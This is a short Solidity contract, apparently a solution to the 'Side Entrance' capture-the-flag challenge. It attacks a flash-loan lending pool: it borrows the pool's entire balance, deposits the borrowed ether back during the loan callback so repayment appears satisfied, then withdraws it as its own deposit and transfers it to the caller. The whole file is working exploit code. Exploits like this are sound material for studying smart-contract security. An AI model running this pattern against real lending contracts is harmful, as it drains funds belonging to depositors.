// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Attacker_sideetrance {
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    fallback() external payable {}

    function attack() external returns (bool) {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        payable(msg.sender).transfer(address(this).balance);

        return true;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
